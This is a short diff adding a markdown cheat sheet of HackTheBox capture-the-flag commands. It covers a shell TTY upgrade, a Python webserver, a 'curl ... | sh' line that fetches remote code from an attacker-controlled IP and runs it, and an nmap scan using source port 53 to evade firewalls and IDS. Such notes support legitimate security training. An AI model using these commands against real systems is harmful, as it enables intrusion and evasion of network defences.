@@ -1,0 +1,29 @@
+---
+title: HackTheBox
+description: Useful HackTheBox commands.
+---
+
+### Upgrade TTY
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+### Start Python webserver
+
+```bash
+sudo python3 -m http.server 80
+```
+
+### Retrieve file from webserver
+
+```bash
+curl http://[YOUR_IP]/file | sh
+```
+
+### Bypass IDS/IPS/Firewall
+
+The following works because sometimes administrators misconfigure the firewall and authorize requests through port 53 (destined to DNS resolution).
+```bash
+sudo nmap [IP] -sS -Pn -n --disable-arp-ping --source-port 53
+```
